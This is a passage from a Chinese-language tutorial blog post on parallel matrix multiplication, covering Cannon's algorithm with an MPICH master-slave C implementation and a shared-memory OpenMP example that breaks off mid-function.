第三步，各个进程执行一次矩阵乘法，累加到$C_{ij}$，然后将$A_{ij}$和$B_{ij}$分别向左向上移动一步<br/>    重复第三步，直到一共计算$\sqrt{n}$次乘法</h5> <h5 id="第五步将各个进程的结果组合得到矩阵乘法结果">   第五步，将各个进程的结果组合得到矩阵乘法结果.</h5> <h5 id="在这种方法中除了乘法运算之外进程之间的通讯也会影响运算速度">   在这种方法中，除了乘法运算之外，进程之间的通讯也会影响运算速度，</h5> <h4 id="分布式并行">分布式并行</h4> <h5 id="分布式并行计算是指将一个大型的计算任务分解成多个较小的子任务这些子任务被分配到多个计算节点如服务器处理器等上同时进行计算这些节点通过网络进行通信和协调最终将各个子任务的计算结果汇总得到整个任务的解决方案mpi是这种分布式并行的一种实现方式mpi是一套在进程间传输数据的接口-现有的mpi实现有mpich-openmpi-intel-mpi根据进程之间通信方式不同mpi的具体操作方式可以分为主从模式和对等模式以下是一个使用mpich基于主从模式的cannon算法的实现">   分布式并行计算是指将一个大型的计算任务分解成多个较小的子任务，这些子任务被分配到多个计算节点（如服务器、处理器等）上同时进行计算。这些节点通过网络进行通信和协调，最终将各个子任务的计算结果汇总，得到整个任务的解决方案<br/>   MPI是这种分布式并行的一种实现方式，MPI是一套在进程间传输数据的接口, 现有的MPI实现有<code class="language-plaintext highlighter-rouge">MPICH, openMPI, Intel MPI</code><br/>   根据进程之间通信方式不同，MPI的具体操作方式可以分为主从模式和对等模式，以下是一个使用MPICH基于主从模式的Cannon算法的实现。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"/usr/include/mpi/mpi.h"</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;math.h&gt;</span><span class="cp">
</span> 
<span class="kt">int</span> <span class="nf">get_index</span><span class="p">(</span><span class="kt">int</span> <span class="n">row</span><span class="p">,</span><span class="kt">int</span> <span class="n">col</span><span class="p">,</span><span class="kt">int</span> <span class="n">N</span><span class="p">){</span>
   <span class="k">return</span> <span class="p">((</span><span class="n">row</span><span class="o">+</span><span class="n">N</span><span class="p">)</span><span class="o">%</span><span class="n">N</span><span class="p">)</span><span class="o">*</span><span class="n">N</span><span class="o">+</span><span class="p">(</span><span class="n">col</span><span class="o">+</span><span class="n">N</span><span class="p">)</span><span class="o">%</span><span class="n">N</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
   <span class="kt">int</span> <span class="n">M</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span><span class="n">N</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span><span class="n">K</span><span class="o">=</span><span class="mi">4</span><span class="p">;</span>
   <span class="kt">int</span> <span class="n">rank</span><span class="p">,</span><span class="n">comm_sz</span><span class="p">;</span>
   <span class="kt">double</span> <span class="n">start</span><span class="p">,</span> <span class="n">stop</span><span class="p">;</span> <span class="c1">//计时时间</span>
   <span class="n">MPI_Status</span> <span class="n">status</span><span class="p">;</span>
 
   <span class="n">MPI_Init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">argc</span><span class="p">,</span><span class="o">&amp;</span><span class="n">argv</span><span class="p">);</span>
   <span class="n">MPI_Comm_size</span><span class="p">(</span><span class="n">MPI_COMM_WORLD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">comm_sz</span><span class="p">);</span>
   <span class="n">MPI_Comm_rank</span><span class="p">(</span><span class="n">MPI_COMM_WORLD</span><span class="p">,</span><span class="o">&amp;</span><span class="n">rank</span><span class="p">);</span>
 
   <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">sqrt</span><span class="p">(</span><span class="n">comm_sz</span><span class="p">);</span> <span class="c1">// A B行列分多少块</span>
 
   <span class="kt">int</span> <span class="n">saveM</span><span class="o">=</span><span class="n">M</span><span class="p">,</span><span class="n">saveN</span><span class="o">=</span><span class="n">N</span><span class="p">,</span><span class="n">saveK</span><span class="o">=</span><span class="n">K</span><span class="p">;</span> <span class="c1">// 为了A B能均分成块</span>

   <span class="kt">int</span> <span class="n">each_M</span><span class="o">=</span><span class="n">M</span><span class="o">/</span><span class="n">a</span><span class="p">,</span><span class="n">each_N</span><span class="o">=</span><span class="n">N</span><span class="o">/</span><span class="n">a</span><span class="p">,</span><span class="n">each_K</span><span class="o">=</span><span class="n">K</span><span class="o">/</span><span class="n">a</span><span class="p">;</span> <span class="c1">// 矩阵A B每块分多少行列数据</span>
 
   <span class="k">if</span><span class="p">(</span><span class="n">rank</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
      <span class="kt">double</span> <span class="o">*</span><span class="n">Matrix_A</span><span class="p">,</span><span class="o">*</span><span class="n">Matrix_B</span><span class="p">,</span><span class="o">*</span><span class="n">Matrix_C</span><span class="p">,</span><span class="o">*</span><span class="n">result_Matrix</span><span class="p">;</span>
      <span class="n">Matrix_A</span><span class="o">=</span><span class="p">(</span><span class="kt">double</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">M</span><span class="o">*</span><span class="n">N</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">double</span><span class="p">));</span>
      <span class="n">Matrix_B</span><span class="o">=</span><span class="p">(</span><span class="kt">double</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">N</span><span class="o">*</span><span class="n">K</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">double</span><span class="p">));</span>
      <span class="n">Matrix_C</span><span class="o">=</span><span class="p">(</span><span class="kt">double</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">M</span><span class="o">*</span><span class="n">K</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">double</span><span class="p">));</span>
      <span class="n">result_Matrix</span><span class="o">=</span><span class="p">(</span><span class="kt">double</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">M</span><span class="o">*</span><span class="n">K</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">double</span><span class="p">));</span> <span class="c1">// 保存数据计算结果</span>
 
      <span class="n">init_Matrix</span><span class="p">(</span><span class="n">Matrix_A</span><span class="p">,</span><span class="n">Matrix_B</span><span class="p">,</span><span class="n">Matrix_C</span><span class="p">,</span><span class="n">M</span><span class="p">,</span><span class="n">N</span><span class="p">,</span><span class="n">K</span><span class="p">,</span><span class="n">saveM</span><span class="p">,</span><span class="n">saveN</span><span class="p">,</span><span class="n">saveK</span><span class="p">);</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"a=%d each_M=%d each_N=%d each_K=%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">each_M</span><span class="p">,</span><span class="n">each_N</span><span class="p">,</span><span class="n">each_K</span><span class="p">);</span>
 
      <span class="n">start</span><span class="o">=</span><span class="n">MPI_Wtime</span><span class="p">();</span>
      <span class="c1">// 主进程计算第1块</span>
      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">each_M</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
         <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">each_K</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">){</span>
            <span class="kt">double</span> <span class="n">temp</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">p</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">p</span><span class="o">&lt;</span><span class="n">N</span><span class="p">;</span><span class="n">p</span><span class="o">++</span><span class="p">){</span>
               <span class="n">temp</span><span class="o">+=</span><span class="n">Matrix_A</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="n">N</span><span class="o">+</span><span class="n">p</span><span class="p">]</span><span class="o">*</span><span class="n">Matrix_B</span><span class="p">[</span><span class="n">p</span><span class="o">*</span><span class="n">K</span><span class="o">+</span><span class="n">j</span><span class="p">];</span>
            <span class="p">}</span>
            <span class="n">result_Matrix</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="n">K</span><span class="o">+</span><span class="n">j</span><span class="p">]</span><span class="o">=</span> <span class="n">temp</span><span class="o">+</span> <span class="n">Matrix_C</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="n">K</span><span class="o">+</span><span class="n">j</span><span class="p">];</span>
         <span class="p">}</span>
      <span class="p">}</span>
 
      <span class="c1">// 向其它进程发送块数据</span>
      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">comm_sz</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
         <span class="kt">int</span> <span class="n">beginRow</span><span class="o">=</span><span class="p">(</span><span class="n">i</span><span class="o">/</span><span class="n">a</span><span class="p">)</span><span class="o">*</span><span class="n">each_M</span><span class="p">;</span> <span class="c1">// 每个块的行列起始位置(坐标/偏移量)</span>
         <span class="kt">int</span> <span class="n">beginCol</span><span class="o">=</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="n">a</span><span class="p">)</span><span class="o">*</span><span class="n">each_K</span><span class="p">;</span>
         <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">each_M</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">)</span>
            <span class="n">MPI_Send</span><span class="p">(</span><span class="n">Matrix_C</span><span class="o">+</span><span class="p">(</span><span class="n">beginRow</span><span class="o">+</span><span class="n">j</span><span class="p">)</span><span class="o">*</span><span class="n">K</span><span class="o">+</span><span class="n">beginCol</span><span class="p">,</span><span class="n">each_K</span><span class="p">,</span><span class="n">MPI_DOUBLE</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="o">+</span><span class="n">each_M</span><span class="o">+</span><span class="n">each_N</span><span class="p">,</span><span class="n">MPI_COMM_WORLD</span><span class="p">);</span>
         <span class="c1">// 发送A B每块数据</span>
         <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">k</span><span class="o">&lt;</span><span class="n">a</span><span class="p">;</span><span class="n">k</span><span class="o">++</span><span class="p">){</span>
            <span class="kt">int</span> <span class="n">begin_part</span><span class="o">=</span><span class="n">k</span><span class="o">*</span><span class="n">each_N</span><span class="p">;</span> <span class="c1">// 移动A的列 B的行 即A列不同程度的左移，B行不同程度的上移</span>
            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">each_M</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">)</span>
               <span class="n">MPI_Send</span><span class="p">(</span><span class="n">Matrix_A</span><span class="o">+</span><span class="p">(</span><span class="n">beginRow</span><span class="o">+</span><span class="n">j</span><span class="p">)</span><span class="o">*</span><span class="n">N</span><span class="o">+</span><span class="n">begin_part</span><span class="p">,</span><span class="n">each_N</span><span class="p">,</span><span class="n">MPI_DOUBLE</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">,</span><span class="n">MPI_COMM_WORLD</span><span class="p">);</span>
            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">p</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">p</span><span class="o">&lt;</span><span class="n">each_N</span><span class="p">;</span><span class="n">p</span><span class="o">++</span><span class="p">)</span>
               <span class="n">MPI_Send</span><span class="p">(</span><span class="n">Matrix_B</span><span class="o">+</span><span class="p">(</span><span class="n">begin_part</span><span class="o">+</span><span class="n">p</span><span class="p">)</span><span class="o">*</span><span class="n">K</span><span class="o">+</span><span class="n">beginCol</span><span class="p">,</span><span class="n">each_K</span><span class="p">,</span><span class="n">MPI_DOUBLE</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">p</span><span class="o">+</span><span class="n">each_M</span><span class="p">,</span><span class="n">MPI_COMM_WORLD</span><span class="p">);</span>
         <span class="p">}</span>
      <span class="p">}</span>
      <span class="c1">// 接收从进程的计算结果</span>
      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">comm_sz</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
         <span class="kt">int</span> <span class="n">beginRow</span><span class="o">=</span><span class="p">(</span><span class="n">i</span><span class="o">/</span><span class="n">a</span><span class="p">)</span><span class="o">*</span><span class="n">each_M</span><span class="p">;</span>
         <span class="kt">int</span> <span class="n">endRow</span><span class="o">=</span><span class="n">beginRow</span><span class="o">+</span><span class="n">each_M</span><span class="p">;</span>
         <span class="kt">int</span> <span class="n">beginCol</span><span class="o">=</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="n">a</span><span class="p">)</span><span class="o">*</span><span class="n">each_K</span><span class="p">;</span>
         <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="n">beginRow</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">endRow</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">)</span>
            <span class="n">MPI_Recv</span><span class="p">(</span><span class="n">result_Matrix</span><span class="o">+</span><span class="n">j</span><span class="o">*</span><span class="n">K</span><span class="o">+</span><span class="n">beginCol</span><span class="p">,</span><span class="n">each_K</span><span class="p">,</span><span class="n">MPI_DOUBLE</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="o">-</span><span class="n">beginRow</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="n">each_M</span><span class="o">+</span><span class="n">each_N</span><span class="p">,</span><span class="n">MPI_COMM_WORLD</span><span class="p">,</span><span class="o">&amp;</span><span class="n">status</span><span class="p">);</span>
      <span class="p">}</span>
 
      <span class="n">Matrix_print2</span><span class="p">(</span><span class="n">result_Matrix</span><span class="p">,</span><span class="n">saveM</span><span class="p">,</span><span class="n">saveK</span><span class="p">,</span><span class="n">K</span><span class="p">);</span>
      <span class="n">stop</span><span class="o">=</span><span class="n">MPI_Wtime</span><span class="p">();</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"rank:%d time:%lfs</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">rank</span><span class="p">,</span><span class="n">stop</span><span class="o">-</span><span class="n">start</span><span class="p">);</span>
 
      <span class="n">free</span><span class="p">(</span><span class="n">Matrix_A</span><span class="p">);</span>
      <span class="n">free</span><span class="p">(</span><span class="n">Matrix_B</span><span class="p">);</span>
      <span class="n">free</span><span class="p">(</span><span class="n">Matrix_C</span><span class="p">);</span>
      <span class="n">free</span><span class="p">(</span><span class="n">result_Matrix</span><span class="p">);</span>
   <span class="p">}</span>
   <span class="k">else</span> <span class="p">{</span>
      <span class="kt">double</span> <span class="o">*</span><span class="n">buffer_A</span><span class="p">,</span><span class="o">*</span><span class="n">buffer_B</span><span class="p">,</span><span class="o">*</span><span class="n">buffer_C</span><span class="p">;</span>
      <span class="n">buffer_A</span><span class="o">=</span><span class="p">(</span><span class="kt">double</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">each_M</span><span class="o">*</span><span class="n">each_N</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">double</span><span class="p">));</span> <span class="c1">// A的均分行的数据</span>
      <span class="n">buffer_B</span><span class="o">=</span><span class="p">(</span><span class="kt">double</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">each_N</span><span class="o">*</span><span class="n">each_K</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">double</span><span class="p">));</span> <span class="c1">// B的均分列的数据</span>
      <span class="n">buffer_C</span><span class="o">=</span><span class="p">(</span><span class="kt">double</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">each_M</span><span class="o">*</span><span class="n">each_K</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">double</span><span class="p">));</span> <span class="c1">// C的均分行的数据</span>
 
      <span class="c1">// 接收C块数据</span>
      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">each_M</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">)</span>
         <span class="n">MPI_Recv</span><span class="p">(</span><span class="n">buffer_C</span><span class="o">+</span><span class="n">j</span><span class="o">*</span><span class="n">each_K</span><span class="p">,</span><span class="n">each_K</span><span class="p">,</span><span class="n">MPI_DOUBLE</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">j</span><span class="o">+</span><span class="n">each_M</span><span class="o">+</span><span class="n">each_N</span><span class="p">,</span><span class="n">MPI_COMM_WORLD</span><span class="p">,</span><span class="o">&amp;</span><span class="n">status</span><span class="p">);</span>
 
      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">k</span><span class="o">&lt;</span><span class="n">a</span><span class="p">;</span><span class="n">k</span><span class="o">++</span><span class="p">){</span> <span class="c1">// 把每块数据求和</span>
         <span class="c1">//接收A B块数据</span>
         <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">each_M</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">)</span>
            <span class="n">MPI_Recv</span><span class="p">(</span><span class="n">buffer_A</span><span class="o">+</span><span class="n">j</span><span class="o">*</span><span class="n">each_N</span><span class="p">,</span><span class="n">each_N</span><span class="p">,</span><span class="n">MPI_DOUBLE</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">j</span><span class="p">,</span><span class="n">MPI_COMM_WORLD</span><span class="p">,</span><span class="o">&amp;</span><span class="n">status</span><span class="p">);</span>
         <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">p</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">p</span><span class="o">&lt;</span><span class="n">each_N</span><span class="p">;</span><span class="n">p</span><span class="o">++</span><span class="p">)</span>
            <span class="n">MPI_Recv</span><span class="p">(</span><span class="n">buffer_B</span><span class="o">+</span><span class="n">p</span><span class="o">*</span><span class="n">each_K</span><span class="p">,</span><span class="n">each_K</span><span class="p">,</span><span class="n">MPI_DOUBLE</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">p</span><span class="o">+</span><span class="n">each_M</span><span class="p">,</span><span class="n">MPI_COMM_WORLD</span><span class="p">,</span><span class="o">&amp;</span><span class="n">status</span><span class="p">);</span>
 
         <span class="c1">//计算乘积结果,并将结果发送给主进程</span>
         <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">each_M</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">each_K</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">){</span>
               <span class="kt">double</span> <span class="n">temp</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
               <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">p</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">p</span><span class="o">&lt;</span><span class="n">each_N</span><span class="p">;</span><span class="n">p</span><span class="o">++</span><span class="p">){</span>
                  <span class="n">temp</span><span class="o">+=</span><span class="n">buffer_A</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="n">each_N</span><span class="o">+</span><span class="n">p</span><span class="p">]</span><span class="o">*</span><span class="n">buffer_B</span><span class="p">[</span><span class="n">p</span><span class="o">*</span><span class="n">each_K</span><span class="o">+</span><span class="n">j</span><span class="p">];</span>
               <span class="p">}</span>
               <span class="k">if</span><span class="p">(</span><span class="n">k</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span>
                  <span class="n">buffer_C</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="n">each_K</span><span class="o">+</span><span class="n">j</span><span class="p">]</span><span class="o">=</span> <span class="n">temp</span><span class="o">+</span> <span class="n">buffer_C</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="n">each_K</span><span class="o">+</span><span class="n">j</span><span class="p">];</span>
               <span class="k">else</span>
                  <span class="n">buffer_C</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="n">each_K</span><span class="o">+</span><span class="n">j</span><span class="p">]</span><span class="o">+=</span> <span class="n">temp</span><span class="p">;</span>
            <span class="p">}</span>
         <span class="p">}</span>
      <span class="p">}</span>
      <span class="c1">// 将结果发送给主进程</span>
      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">each_M</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">){</span>
         <span class="n">MPI_Send</span><span class="p">(</span><span class="n">buffer_C</span><span class="o">+</span><span class="n">j</span><span class="o">*</span><span class="n">each_K</span><span class="p">,</span><span class="n">each_K</span><span class="p">,</span><span class="n">MPI_DOUBLE</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">j</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="n">each_M</span><span class="o">+</span><span class="n">each_N</span><span class="p">,</span><span class="n">MPI_COMM_WORLD</span><span class="p">);</span>
      <span class="p">}</span>
 
      <span class="n">free</span><span class="p">(</span><span class="n">buffer_A</span><span class="p">);</span>
      <span class="n">free</span><span class="p">(</span><span class="n">buffer_B</span><span class="p">);</span>
      <span class="n">free</span><span class="p">(</span><span class="n">buffer_C</span><span class="p">);</span>
   <span class="p">}</span>
   <span class="n">MPI_Finalize</span><span class="p">();</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="由于进程有独立的内存空间维护进程空间需要消耗一定资源其次由于内存互不重叠进程之间的消息必须显式地传递和接收相较于单一机器使用mpi更适合计算机集群中使用">   由于进程有独立的内存空间，维护进程空间需要消耗一定资源。其次，由于内存互不重叠，进程之间的消息必须显式地传递和接收。相较于单一机器使用，MPI更适合计算机集群中使用。</h5> <h3 id="线程级别并行">线程级别并行</h3> <h5 id="在上述分布式并行中提及了由于基于消息传递优化的卡农算法而对于单一机器多核处理器来说实际上没有必要将计算单元的数据相互隔离对应地也就是没有必要为每个运算单元维护进程在一个进程中使用多个线程即可由于线程间共享内存也就避免了复杂地消息传播">   在上述分布式并行中，提及了由于基于消息传递优化的卡农算法，而对于单一机器多核处理器来说，实际上没有必要将计算单元的数据相互隔离。对应地，也就是没有必要为每个运算单元维护进程，在一个进程中使用多个线程即可，由于线程间共享内存，也就避免了复杂地消息传播.</h5> <h4 id="共享内存并行">共享内存并行</h4> <h5 id="基于上述的理念提出了基于多线程的共享内存并行具体到编程时可以使用手动管理posix线程-也可以使用openmpopen-multiple-processing-添加预编译命令完成">   基于上述的理念，提出了基于多线程的共享内存并行。具体到编程时，可以使用<pthread.h>手动管理POSIX线程, 也可以使用OpenMP(Open Multiple processing), 添加预编译命令完成</pthread.h></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;cstring&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;omp.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
</span>
<span class="k">const</span> <span class="kt">int</span> <span class="n">N</span> <span class="o">=</span> <span class="mi">64</span><span class="p">;</span>
<span class="kt">float</span> <span class="n">NormalMul</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">N</span><span class="p">];</span>
<span class="kt">float</span> <span class="n">MPMul</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">N</span><span class="p">];</span>

<span class="kt">void</span> <span class="nf">check</span><span class="p">(){</span>
    <span class="c1">// 检查使用，输出前16个元素并对比</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">NormalMul</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">i</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="sc">' '</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">MPMul</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">i</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="sc">' '</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>

<span class="p">}</span>

<span class="kt">void</span> <span class="nf">MulNormal</span><span class="p">(</span><span class="kt">float</span> <span class="o">**</span><span class="n">A</span><span class="p">,</span> <span class="kt">float</span> <span class="o">**</span><span class="n">B</span><span class="p">){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">){</span>
            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span><span class="p">){</span>
                <span class="n">NormalMul</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">+=</span> <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">*</span> <span class="n">B</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span><span class="p">];</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">MulMP</span><span class="p">(</span><span class="kt">float</span> <span class="o">**</span><span class="n">A</span><span class="p">,</span> <span class="kt">float</span> <span class="o">**</span><span class="n">B</span><span class="p">){</span>
    <span class="c1">// 在此处添加预编译命令</span>
    <span class="cp">#pragma omp parallel for num_threads(4) schedule(dynamic)
</span>    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">){</span>
            <span class="kt">float</span> <span class="n">temp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
